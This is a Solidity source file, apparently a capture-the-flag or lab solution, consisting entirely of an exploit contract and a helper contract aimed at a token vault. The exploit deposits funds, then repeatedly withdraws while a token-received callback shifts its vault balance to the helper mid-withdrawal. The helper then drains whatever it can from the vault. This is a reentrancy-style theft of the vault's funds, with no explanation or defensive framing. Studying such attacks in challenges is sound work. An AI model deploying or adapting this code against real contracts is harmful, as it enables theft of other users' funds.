// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IToken {
    function wrap() external payable;
    function approve(address, uint) external returns (bool);
    function balanceOf(address) external view returns (uint);
}

interface IVault {
    function token() external view returns (address);
    function deposit(uint) external;
    function withdraw(uint) external;
    function transfer(address, uint) external;
    function balanceOf(address) external view returns (uint);
}

contract Helper {
    function drain(IVault v, IToken t) external {
        uint amt = t.balanceOf(address(v));
        uint bal = v.balanceOf(address(this));
        if (amt > bal) amt = bal;
        v.withdraw(amt);
    }
    function onTokenReceived(address, uint) external {}
}

contract Exploit {
    IVault vault;
    IToken token;
    Helper helper;
    bool active;

    constructor(address target) payable {
        vault = IVault(target);
        token = IToken(vault.token());
        helper = new Helper();
        token.wrap{value: msg.value}();
        token.approve(target, msg.value);
        vault.deposit(msg.value);
    }

    function run() external {
        active = true;
        for (uint i = 0; i < 12; i++) {
            vault.withdraw(1);
        }
        active = false;
        helper.drain(vault, token);
    }

    function onTokenReceived(address, uint) external {
        if (active && msg.sender == address(token)) {
            uint b = vault.balanceOf(address(this));
            if (b > 0) vault.transfer(address(helper), b);
        }
    }
}
